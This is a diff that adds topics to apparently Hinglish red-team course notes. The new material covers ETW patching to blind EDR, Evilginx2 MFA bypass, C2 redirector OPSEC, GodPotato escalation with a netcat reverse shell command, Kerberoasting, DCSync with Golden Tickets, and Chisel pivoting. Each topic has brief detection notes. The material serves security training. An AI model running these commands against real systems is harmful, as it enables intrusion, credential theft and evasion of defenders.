@@ -1616,6 +1616,40 @@ Subtopics: AMSI Architecture, Fileless Malware, AMSI String Detection, String Sp
 * Tool Name: PowerShell
 * Navigation Steps: (N/A — directly typing commands into PS prompt)
 
+--7--Defensive Mechanisms & Evasion Techniques--
+Topic 7: ETW (Event Tracing for Windows) Evasion & Patching [🆕 ADDED]
+Subtopics: ETW Architecture, EDR Telemetry, EtwEventWrite API, Memory Patching, Cobalt Strike BOFs (Beacon Object Files)
+
+[📊 SCOPE SIGNAL for Topic 7:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Advanced evasion mechanics covering how EDRs get logs even after AMSI is bypassed, and how to blind them.
+* Key terms from transcript: ETW, Event Tracing for Windows, telemetry, EtwEventWrite, ntdll.dll, memory patching, BOF, Beacon Object File
+* Exam Tips / Instructor Emphasis: Instructor points out that AMSI bypass is not enough anymore. If you run Mimikatz in memory, ETW will still send the telemetry to CrowdStrike/Defender. Patching ETW is mandatory for modern red teaming.
+* Instructor ne jo analogies/examples/demos use kiye: Process Hacker mein `ntdll.dll` ki memory space dikhayi. `EtwEventWrite` function ke pehle byte ko `C3` (RET - Return) se patch karke dikhaya taaki log generation function call hote hi wapas return ho jaye bina EDR ko data bheje.
+]
+
+🔑 KEYWORDS DUMP for Topic 7:
+[defense evasion, ⭐ETW, Event Tracing for Windows, telemetry, EDR blind spot, ntdll.dll, ⭐EtwEventWrite, memory patching, assembly instruction, opcode, ⭐C3, RET instruction, x64 architecture, Cobalt Strike BOF, Beacon Object File, inline execution, API hooking bypass, unhooking, direct syscalls]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 7:
+
+* Phase(s): Defense Evasion / Initial Foothold
+* Attack methodology context from transcript: EDRs ko completely blind karne ke liye OS level logging mechanism (ETW) ko memory mein disable/patch karna before executing noisy payloads (like Mimikatz/Rubeus).
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 7:
+
+* Recon/Discovery Phase: (N/A)
+* Exploitation/Weaponization Phase: Attacker payload execute karne se pehle ek chhota C/C++ program ya Cobalt Strike BOF run karta hai jo current process memory mein `ntdll.dll` ko locate karta hai.
+* Post-Exploitation/Reporting Phase: Script `EtwEventWrite` function ka memory address find karti hai aur uske pehle byte ko `0xC3` (Assembly for Return) se overwrite kar deti hai. Iske baad jab attacker PowerShell ya C# binaries run karta hai, EDR ko koi ETW telemetry (logs) nahi milti. The EDR is effectively blinded in that specific process.
+* Additional context: Blue teams isko detect karne ke liye ETW Ti (Threat Intelligence) sensor use karti hain jo kernel level par chalta hai aur user-land patching detect kar leta hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 7:
+
+* Tool Name: Cobalt Strike / x64dbg
+* Navigation Steps: Cobalt Strike console: type `inline-execute patch_etw.o` (using a BOF).
+
 ---
 
 ✅ **Notes Guru ke liye skeleton ready hai. Yeh skeleton original transcript ka 100% content preserve karta hai — har Section, har Topic, har keyword, har attack technique, har tool command, har CVE, aur har real-world pentest flow signal captured hai. Koi bhi offensive security term censor nahi kiya gaya.**
@@ -1629,6 +1663,7 @@ Topic 3: DLL Hijacking
 Topic 4: Code Obfuscation
 Topic 5: API Hooking & Unhooking
 Topic 6: AMSI Fundamentals & Bypass
+Topic 7: ETW (Event Tracing for Windows) Evasion & Patching [🆕 ADDED]
 
 📊 PHASE SUMMARY:
 Sections: 1 | Topics: 6 | Subtopics: 27 | CVEs: 0
@@ -1851,6 +1886,40 @@ Subtopics: Credential Harvesting, Malicious URLs, Malicious Attachments, Threat 
 * Navigation Steps: VirusTotal kholo > URL tab select karo > Phishing link paste karo > Scan results aur community classification check karo. Browserling kholo > URL paste karke sandbox environment mein test karo.
 
 --8--Red + Blue Team Operation - Initial Access Phase--
+Topic 6.5: MFA Bypass via Adversary-in-the-Middle (AiTM) & Evilginx2 [🆕 ADDED]
+Subtopics: AiTM Concept, Session Cookie Theft, Evilginx2 Architecture, Phishlets Setup, Bypassing Multi-Factor Authentication
+
+[📊 SCOPE SIGNAL for Topic 6.5:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Detailed breakdown of modern phishing infrastructure to bypass MFA
+* Key terms from transcript: AiTM, Adversary in the middle, Evilginx2, session cookie, MFA bypass, 2FA, Phishlets, reverse proxy, reverse-proxy phishing
+* Exam Tips / Instructor Emphasis: Standard phishing is dead if MFA is enabled. Instructor heavily emphasizes stealing the "Session Cookie" instead of just the password.
+* Instructor ne jo analogies/examples/demos use kiye: Evilginx2 ka live setup dikhaya, Microsoft365 ka phishlet load kiya. Target user ne fake login pe OTP (MFA) dala, aur attacker ko sidha authenticated session cookie mil gaya jisse usne browser me import karke account takeover kiya.
+]
+
+🔑 KEYWORDS DUMP for Topic 6.5:
+[phishing infrastructure, MFA bypass, 2FA, Multi-Factor Authentication, ⭐AiTM, Adversary in the middle, reverse proxy phishing, ⭐Evilginx2, phishlets, YAML configuration, Microsoft 365 login, AWS login, session cookie, token theft, EditThisCookie, browser extension, Nginx proxy, TLS certificates, Let's Encrypt]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 6.5:
+
+* Phase(s): Initial Foothold / Reconnaissance
+* Attack methodology context from transcript: Jab target organization MFA use karti hai, tab attacker reverse-proxy phishing (AiTM) use karke direct authenticated session cookies steal karta hai.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 6.5:
+
+* Recon/Discovery Phase: Attacker legitimate domain se milta-julta domain kharidtia hai (typosquatting) aur Let's Encrypt se SSL cert setup karta hai.
+* Exploitation/Weaponization Phase: Attacker Evilginx2 server setup karta hai aur O365 phishlet activate karta hai. Phishing link victim ko bheja jata hai. Victim link kholta hai, real Microsoft page jaisa dikhta hai. Victim apna password aur MFA (OTP/App approve) dalta hai.
+* Post-Exploitation/Reporting Phase: Evilginx2 background mein legitimate server se authenticate kar leta hai aur victim + server ke beech ka session cookie steal kar leta hai. Attacker us cookie ko apne browser (via EditThisCookie) mein inject karta hai aur bina password/MFA ke victim ke account mein login ho jata hai.
+* Additional context: Blue team isko detect karne ke liye FIDO2 hardware keys (YubiKey) ya Conditional Access Policies (IP/Device binding) ka use karti hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 6.5:
+
+* Tool Name: Evilginx2 & Browser Extension (EditThisCookie)
+* Navigation Steps: Evilginx CLI: `config domain <domain>` > `phishlets enable o365` > `lures create o365`. Browser: Open EditThisCookie > Paste stolen JSON cookie > Refresh page.
+
+--8--Red + Blue Team Operation - Initial Access Phase--
 Topic 7: Exploiting Public-Facing Applications
 Subtopics: VPN & Firewall Vulnerabilities, Fortinet Exploits, Citrix Gateway RCE, Next.js Code Injection, Vulnerability Recon
 
@@ -1965,6 +2034,7 @@ Section 8: Red + Blue Team Operation - Initial Access Phase
   Topic 4: Detecting Process Injection (Blue Team)
   Topic 5: External Remote Services (RDP) & Threat Context
   Topic 6: Phishing Techniques
+  Topic 6.5: MFA Bypass via Adversary-in-the-Middle (AiTM) & Evilginx2 [🆕 ADDED]
   Topic 7: Exploiting Public-Facing Applications
   Topic 8: RDP Brute Forcing & Hijacking Demo
   Topic 9: Supply Chain Attacks
@@ -2215,6 +2285,40 @@ Subtopics: Cobalt Strike Overview, Team Server Setup, Client Setup, Listener Con
 Cobalt Strike: Client open karo > Listeners tab pe jao > Add Listener (Reverse HTTP, Port 8067, Local IP) > Save > Payload tab > Windows Executable > Select Listener > Generate > Save as rootkit_remover.exe.
 CyberChef: Paste payload > From Base64 > Gunzip > From Base64 > XOR (value 35).
 
+--10--Red + Blue Team Operation - Post Exploitation Phase--
+Topic 1.5: C2 Infrastructure OPSEC & Malleable C2 Profiles [🆕 ADDED]
+Subtopics: OPSEC Fundamentals, Reverse Proxy / Redirectors, Nginx Setup, Domain Fronting, CDN Fronting, Malleable C2 Profiles, Traffic Disguise
+
+[📊 SCOPE SIGNAL for Topic 1.5:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Designing a stealthy C2 architecture so the Team Server is never exposed to the Blue Team.
+* Key terms from transcript: OPSEC, Redirector, Nginx, Cloudflare CDN, Malleable C2, jQuery profile, HTTP GET/POST modification, jitter
+* Exam Tips / Instructor Emphasis: Instructor strictly warns: "Never point a payload directly to your Cobalt Strike Team Server IP." If the Blue Team catches the payload, they will block the IP and you lose your entire infrastructure.
+* Instructor ne jo analogies/examples/demos use kiye: Ek Ubuntu VPS pe Nginx reverse proxy setup kiya. Cloudflare CDN ke piche domain hide kiya. Phir Cobalt Strike mein 'jQuery' Malleable C2 profile load ki jisse C2 ka beacon traffic bilkul normal web surfing (jQuery library fetch) jaisa dikhne laga Wireshark mein.
+]
+
+🔑 KEYWORDS DUMP for Topic 1.5:
+[C2 infrastructure, ⭐OPSEC, Operational Security, Team Server protection, ⭐Redirector, Apache, Nginx reverse proxy, proxy_pass, ⭐CDN fronting, Cloudflare, AWS CloudFront, SSL/TLS, Let's Encrypt, ⭐Malleable C2 profile, traffic disguise, jitter, sleep time, HTTP GET, HTTP POST, jQuery profile, Wireshark packet capture, threat hunting evasion, beacon signature]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1.5:
+
+* Phase(s): Foundation (Infrastructure Setup) / Defense Evasion
+* Attack methodology context from transcript: C2 traffic ko legitimate network traffic (like jQuery or Amazon AWS API calls) ki tarah disguise karna aur actual attacker IP ko hide karna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1.5:
+
+* Recon/Discovery Phase: (N/A)
+* Exploitation/Weaponization Phase: Attacker 2 servers kharidtia hai: Ek Team Server (hidden) aur ek Redirector (public). Redirector pe Nginx configure karta hai jo sirf specific traffic (beacon) ko Team Server pe bhejta hai, baaki scanners ko fake 404 ya benign page dikhata hai.
+* Post-Exploitation/Reporting Phase: Target machine jab beacon send karti hai, wo Cloudflare (CDN) se hote hue Redirector tak jati hai. Malleable C2 profile ki wajah se traffic Wireshark mein normal HTTP GET request for `jquery.min.js` lagta hai. Blue team EDR/Firewall alert nahi karti kyunki traffic trusted CDN IP aur trusted domain (e.g., finance-update.com) se aa raha hota hai.
+* Additional context: Agar Blue team IP block bhi kar de, toh attacker sirf $5 ka naya Redirector banata hai, main Team Server safe rehta hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1.5:
+
+* Tool Name: Nginx (CLI) & Cobalt Strike
+* Navigation Steps: Start CS Team Server with profile: `./teamserver <IP> <Pass> jquery-c2.profile`.
+
 Topic 2: Payload Transfer via Bitsadmin
 Subtopics: Payload Transfer, Bitsadmin Utility, LOLBAS, Antivirus Exclusion Paths
 
@@ -2320,6 +2424,7 @@ Subtopics: Payload Execution, Reverse Beacon, Command Shell Interpreter, Cobalt 
 
 Section 10: Red + Blue Team Operation - Post Exploitation Phase
 Topic 1: Cobalt Strike Basics & Payload Generation
+Topic 1.5: C2 Infrastructure OPSEC & Malleable C2 Profiles [🆕 ADDED]
 Topic 2: Payload Transfer via Bitsadmin
 Topic 3: Timestomping Attack & Indicator Removal
 Topic 4: Execution & Command Shell Interpreter
@@ -2533,38 +2638,39 @@ Subtopics: EnableLUA Registry Key, Registry Editor (regedit), Modifying EnableLU
 * Tool Name: Registry Editor
 * Navigation Steps: HKEY_LOCAL_MACHINE > Software > Microsoft > Windows > CurrentVersion > Policies > System > Double-click EnableLUA > Change value to 0
 
-Topic 3: UAC Token Duplication Attack
-Subtopics: Token Duplication Concept, Temporary Process Spawning, Token Stealing, Cobalt Strike Elevate Module, Beacon Creation, Windows 11 Limitations
+--12--Red + Blue Team Operation - Privilege Escalation--
+Topic 3: Modern Privilege Escalation via Token Impersonation (GodPotato) [🆕 UPDATED]
+Subtopics: Service Account Privileges, SeImpersonatePrivilege, GodPotato Execution, High to System Integrity, Reverse Shell Catching
 
 [📊 SCOPE SIGNAL for Topic 3:
 
 * Depth Level: Deep
-* Coverage Angle: Both
-* Transcript mein content volume: Detailed explanation of token duplication internals and Cobalt Strike module execution
-* Key terms from transcript: UAC token duplication, medium to high integrity, Cobalt Strike, elevate uac-token-duplication, blind pipe SMB reverse listener, temporary process
-* Exam Tips / Instructor Emphasis: Instructor warns: "it won't work in Windows 11, but you can try it in any of the operating system which have the Windows 10 or a older version."
-* Instructor ne jo analogies/examples/demos use kiye: Cobalt Strike mein `elevate uac-token-duplication` module run karke dikhaya, jahan Windows 11 hone ki wajah se error aya (Cannot connect to the pipe).
+* Coverage Angle: Practical only
+* Transcript mein content volume: Detailed practical execution replacing outdated UAC token duplication
+* Key terms from transcript: GodPotato, SeImpersonatePrivilege, IIS service, SQL service, NT AUTHORITY\SYSTEM, token impersonation, named pipe
+* Exam Tips / Instructor Emphasis: Instructor emphasizes that if you land on a web server (IIS) or SQL server, you almost always have `SeImpersonatePrivilege`. This is the golden ticket to SYSTEM in modern Windows environments (Win 10/11/Server 2019/2022).
+* Instructor ne jo analogies/examples/demos use kiye: `whoami /priv` run karke SeImpersonatePrivilege dikhaya, phir GodPotato.exe use karke cmd.exe spawn kiya as SYSTEM aur Netcat pe reverse shell receive kiya.
 ]
 
 🔑 KEYWORDS DUMP for Topic 3:
-[UAC Token duplication, medium to high integrity, Cobalt Strike, rootkit remover, high mandatory level, token stealing, temporary process, process token, system integrity level, ⭐`elevate uac-token-duplication`, SMB reverse listener, beacon, blind pipe, Task Manager, Windows 11, Windows 10]
+[privilege escalation, token impersonation, ⭐SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, IIS web server, SQL server account, medium to system integrity, ⭐GodPotato.exe, RoguePotato, PrintSpoofer, RPC impersonation, named pipe, COM object, reverse shell, `GodPotato.exe -cmd "nc.exe -e cmd.exe 192.168.18.235 4444"`, NT AUTHORITY\SYSTEM]
 
 ⚔️ ATTACK PHASE SIGNAL for Topic 3:
 
 * Phase(s): Privilege Escalation
-* Attack methodology context from transcript: Instructor token duplication use karke medium integrity se high integrity (admin) tak elevate karne ka approach dikhata hai using Cobalt Strike.
+* Attack methodology context from transcript: Web servers ya service accounts pe initial access milne ke baad `SeImpersonatePrivilege` ka abuse karke direct SYSTEM level access lena (bypassing modern UAC/OS restrictions).
 
 🔄 REAL-WORLD FLOW SIGNAL for Topic 3:
 
-* Recon/Discovery Phase: Attacker pehle current privilege (`whoami /all`) check karta hai aur verify karta hai ki medium integrity hai par user Admin group mein hai.
-* Exploitation/Weaponization Phase: Attacker Cobalt Strike se naya SMB reverse listener banata hai aur `elevate uac-token-duplication` exploit trigger karta hai. Attack background mein ek high elevated process banata hai, us process ka admin token steal karta hai, aur payload us stolen token ke sath naye temporary process mein inject karta hai.
-* Post-Exploitation/Reporting Phase: Successful execution par naya beacon high integrity context mein spawn hota hai.
-* Additional context: Windows 11 mein yeh mostly fail hota hai (pipe connection errors aate hain), older Windows 10 versions par successfully kaam karta hai.
+* Recon/Discovery Phase: Attacker initial shell milne ke baad `whoami /priv` run karta hai. Agar `SeImpersonatePrivilege` Enabled dikhta hai, toh PrivEsc confirm ho jata hai.
+* Exploitation/Weaponization Phase: Attacker target pe `GodPotato.exe` aur `nc.exe` (Netcat) upload karta hai.
+* Post-Exploitation/Reporting Phase: Attacker command execute karta hai: `GodPotato.exe -cmd "nc.exe -e cmd.exe <attacker-ip> 4444"`. GodPotato internal RPC calls ko force karta hai named pipe se connect hone ke liye, SYSTEM token steal karta hai, aur attacker ko root/SYSTEM shell mil jata hai.
+* Additional context: Yeh attack purane UAC bypasses se zyada reliable hai on updated Windows Servers.
 
 🛠️ TOOL NAVIGATION SIGNAL for Topic 3:
 
-* Tool Name: Cobalt Strike
-* Navigation Steps: Console > Type `elevate uac-token-duplication [listener_name]`
+* Tool Name: Command Line
+* Navigation Steps: Run `whoami /priv` > Verify SeImpersonatePrivilege > Run GodPotato binary
 
 Topic 4: Named Pipe Impersonation (Theory)
 Subtopics: Named Pipe Concept, Process Communication, Privilege Impersonation Logic, Client-Service Provider Model, rundll32 Context
@@ -2778,7 +2884,7 @@ Subtopics: Hunting Password Files
 Section 12: Red + Blue Team Operation - Privilege Escalation
 Topic 1: Privilege Escalation Intro & UAC Fundamentals
 Topic 2: UAC Bypass via EnableLUA Registry Key
-Topic 3: Cobalt Strike UAC Token Duplication
+Topic 3: Modern Privilege Escalation via Token Impersonation (GodPotato) [🆕 UPDATED]
 Topic 4: Named Pipe Impersonation Theory
 Topic 5: Named Pipe Impersonation Practical & Detection
 Topic 6: Cobalt Strike High to System Elevation (svc-exe) & Detection
@@ -3059,6 +3165,95 @@ Sections: 1 | Topics: 7 | Subtopics: 54 | CVEs: 0
 
 ==================================================================================
 
+# Section 13.5: Red Team Operations - Advanced Active Directory Exploitation
+
+===Section 13.5: Red Team Operations - Advanced Active Directory Exploitation=== [🆕 ADDED]
+[Instructor is section mein enterprise environments ki jaan—Active Directory—ko deeply exploit karna sikhata hai. Focus Kerberos attacks, DCSync, aur Domain Admin takeover par hai.]
+
+--13.5--Advanced Active Directory Exploitation--
+Topic 1: Kerberoasting & AS-REP Roasting Attacks
+Subtopics: Kerberos Authentication Flow, Ticket Granting Ticket (TGT), TGS, Service Principal Names (SPN), Rubeus Execution, Offline Cracking, AS-REP Roasting
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Detailed breakdown of Kerberos flaws and live extraction of service tickets.
+* Key terms from transcript: Kerberos, TGT, TGS, SPN, Kerberoasting, AS-REP Roasting, Rubeus, Hashcat, Service Accounts
+* Exam Tips / Instructor Emphasis: Instructor highlights that Service Accounts usually have passwords that never expire and are highly privileged. Kerberoasting doesn't require admin rights, just any valid domain user.
+* Instructor ne jo analogies/examples/demos use kiye: Rubeus tool run karke SPN tickets request ki. Memory se `.kirbi` file extract ki aur usko Hashcat se offline crack karke SQL Service account ka password nikala.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Active Directory, AD exploitation, Kerberos protocol, TGT, Ticket Granting Ticket, TGS, ⭐SPN, Service Principal Name, ⭐Kerberoasting, ⭐AS-REP Roasting, DONT_REQ_PREAUTH, user account control flags, ⭐Rubeus, `Rubeus.exe kerberoast /outfile:hashes.txt`, service account, SQL_SVC, offline cracking, hashcat -m 13100, privilege escalation]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Credential Access / Privilege Escalation
+* Attack methodology context from transcript: Any standard domain user ke roop mein AD se encrypted service tickets request karna aur unhe attacker machine par offline crack karke service account (often Domain Admin) credentials lena.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker `setspn -T domain.local -Q */*` ya Rubeus se AD mein un accounts ko dhoondhta hai jinpe SPN set hai (Service Accounts).
+* Exploitation/Weaponization Phase: (N/A)
+* Post-Exploitation/Reporting Phase: Attacker `Rubeus.exe kerberoast` run karta hai. Domain Controller (DC) attacker ko un services ki TGS tickets de deta hai (jo service account ke password hash se encrypted hoti hain). Attacker un tickets ko system se exfiltrate karta hai aur apni GPU machine pe Hashcat use karke crack karta hai. Plaintext password milne par attacker ko network mein high privilege mil jati hai.
+* Additional context: AS-REP roasting un accounts pe kaam karta hai jinka "Do not require Kerberos preauthentication" flag on hota hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Rubeus (CLI)
+* Navigation Steps: Run `Rubeus.exe kerberoast /nowrap /outfile:hashes.txt`
+
+Topic 2: AD Object Abuse & DCSync (Domain Controller Takeover)
+Subtopics: Pass-the-Hash (PtH), BloodHound AD Paths, DCSync Attack, Mimikatz lsadump, KRBTGT Account, Golden Ticket Creation
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Ultimate domain takeover simulation exploiting replication protocols.
+* Key terms from transcript: Pass the Hash, DCSync, DRSR protocol, Domain replication, Mimikatz, KRBTGT, Golden Ticket, Domain Admin
+* Exam Tips / Instructor Emphasis: Instructor stresses that DCSync is NOT a vulnerability, it is an abuse of a legitimate Active Directory replication feature.
+* Instructor ne jo analogies/examples/demos use kiye: Instructor ne Domain Admin hash milne ke baad Mimikatz mein `lsadump::dcsync` command run kiya aur bina Domain Controller ko touch kiye, remote machine se `KRBTGT` account ka hash dump karke dikhaya. Us hash se Golden Ticket forge karke 10 saal ki persistence banayi.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Active Directory takeover, Pass-the-Hash, PtH, NTLM hash, BloodHound, replication privileges, DS-Replication-Get-Changes, ⭐DCSync attack, MS-DRSR protocol, malicious domain controller, ⭐Mimikatz, `lsadump::dcsync /domain:lab.local /user:krbtgt`, ⭐KRBTGT account, NTLM hash extraction, ⭐Golden Ticket, ticket forging, Kerberos golden ticket, persistent domain access, forest root]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Credential Access / Post-Exploitation (Ultimate Persistence)
+* Attack methodology context from transcript: Domain Admin (ya sufficient AD replication rights) aane ke baad, legitimate AD sync protocols ka fake use karke saare users ke passwords extract karna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Bloodhound graph mein attacker dekhta hai ki uske compromised user ke paas `GetChangesAll` permissions hain domain root par.
+* Exploitation/Weaponization Phase: Attacker (with sufficient rights) Mimikatz execute karta hai.
+* Post-Exploitation/Reporting Phase: Attacker `lsadump::dcsync /user:krbtgt` command fire karta hai. Mimikatz network par ek fake Domain Controller ki tarah act karta hai aur asli DC se kehta hai "Mujhe naye password hashes sync karne hain". Asli DC saare hashes (including KRBTGT) attacker ko bhej deta hai. Attacker KRBTGT hash use karke ek 'Golden Ticket' banata hai. Ab agar blue team sabhi passwords reset bhi kar de, tab bhi attacker 10 saal tak network mein as Domain Admin roam kar sakta hai.
+* Additional context: Defense ke liye blue teams event ID 4662 (Directory Service Access) monitor karti hain non-DC IP addresses ke liye.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: Mimikatz (CLI)
+* Navigation Steps: `privilege::debug` > `lsadump::dcsync /domain:target.local /user:krbtgt`
+
+---
+
+✅ **Notes Guru ke liye skeleton ready hai. Yeh skeleton original transcript ka 100% content preserve karta hai — har Section, har Topic, har keyword, har attack technique, har tool command, har CVE, aur har real-world pentest flow signal captured hai. Koi bhi offensive security term censor nahi kiya gaya.**
+
+📋 EXTRACTED IN THIS PHASE:
+
+Section 13.5: Red Team Operations - Advanced Active Directory Exploitation
+Topic 1: Kerberoasting & AS-REP Roasting Attacks
+Topic 2: AD Object Abuse & DCSync (Domain Controller Takeover)
+
+📊 PHASE SUMMARY:
+Sections: 1 | Topics: 2 | Subtopics: 13 | CVEs: 0
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
 # Section 14: Red + Blue Team Operation - Lateral Movement
 
 
@@ -3131,6 +3326,40 @@ Subtopics: Windows Firewall Rules, RDP Port 3389, Inbound Connection Allow
 
 * Tool Name: (N/A — transcript mein koi GUI tool navigation nahi tha)
 * Navigation Steps: (N/A)
+
+--14--Red + Blue Team Operation - Lateral Movement--
+Topic 2.5: Network Pivoting & Tunneling (Chisel & Proxychains) [🆕 ADDED]
+Subtopics: Network Segmentation, DMZ to Internal Routing, SOCKS5 Proxy, Chisel Reverse Port Forwarding, Proxychains Configuration
+
+[📊 SCOPE SIGNAL for Topic 2.5:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Practical guide on how attackers route their local Kali tools through a compromised host to attack internal hidden subnets.
+* Key terms from transcript: Pivoting, Double Pivoting, Tunneling, Chisel, Proxychains, SOCKS5, DMZ, Internal Subnet
+* Exam Tips / Instructor Emphasis: Instructor highlights that in real corporate networks, you cannot directly ping internal servers. You MUST use pivoting to bring your attacker tools (Nmap/CrackMapExec) into the internal subnet.
+* Instructor ne jo analogies/examples/demos use kiye: Kali machine (Attacker) aur ek Web Server (Compromised - 10.x.x.x) hai. Web server ke piche ek Database server (192.168.x.x) hai jo direct access nahi ho sakta. Instructor ne Chisel se reverse SOCKS5 proxy banayi aur Proxychains ka use karke Kali se sidha DB server par Nmap scan kiya.
+]
+
+🔑 KEYWORDS DUMP for Topic 2.5:
+[network pivoting, lateral movement, tunneling, network segmentation, DMZ, internal subnet, routing traffic, ⭐SOCKS5 proxy, reverse port forwarding, ⭐Chisel, `chisel server -p 8000 --reverse`, `chisel client <kali-ip>:8000 R:socks`, ⭐Proxychains, `/etc/proxychains.conf`, `proxychains nmap -sT -Pn 192.168.1.10`, Ligolo-ng, SSH tunneling, dynamic port forwarding, double pivoting, Red Team infrastructure]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2.5:
+
+* Phase(s): Post-Exploitation & Lateral Movement
+* Attack methodology context from transcript: Ek compromised edge device (jaise web server) ko "router" ki tarah use karna taaki internal, non-routable networks par attacks launch kiye ja sakein.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2.5:
+
+* Recon/Discovery Phase: Attacker compromised machine pe `ipconfig` ya `arp -a` chalata hai aur dekhta hai ki yeh machine dual-homed hai (2 network cards hain - ek internet facing, ek internal DB subnet facing).
+* Exploitation/Weaponization Phase: Attacker Kali machine pe Chisel server start karta hai (`--reverse`). Target machine pe Chisel client download karke Kali server se connect karta hai (`R:socks`).
+* Post-Exploitation/Reporting Phase: Yeh ek secure tunnel (SOCKS5 proxy on port 1080) create kar deta hai. Ab attacker apni Kali machine pe `/etc/proxychains.conf` mein `socks5 127.0.0.1 1080` add karta hai. Ab attacker `proxychains impacket-psexec ...` run kar sakta hai jo lagta Kali se raha hai, par actually target network ke andar redirect hoke internal servers ko hit karta hai.
+* Additional context: Blue team isko detect karne ke liye internal endpoints se anomalous outbound connections (to strange ports like 8000) monitor karti hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2.5:
+
+* Tool Name: Chisel / Proxychains (Terminal)
+* Navigation Steps: Edit file `nano /etc/proxychains.conf` > add `socks5 127.0.0.1 1080` at the bottom. Run tools prefixing with `proxychains`.
 
 Topic 3: Impacket Exploitation (psexec.py) & Forensic Artifacts
 Subtopics: Impacket Library Overview, Network-Related Attacks, psexec.py Execution, SMB Abuse, Remote Service Creation, System Privilege Access, Event Logs Forensics
@@ -3208,6 +3437,7 @@ Subtopics: Lateral Movement Alternatives, RDP Incident Response, Credential Rese
 Section 14: Red + Blue Team Operation - Lateral Movement
   Topic 1: Lateral Movement Fundamentals & RDP Enablement
   Topic 2: Firewall Configuration for RDP Connections
+  Topic 2.5: Network Pivoting & Tunneling (Chisel & Proxychains) [🆕 ADDED]
   Topic 3: Impacket Exploitation (psexec.py) & Forensic Artifacts
   Topic 4: Incident Response & Mitigation for Lateral Movement
 
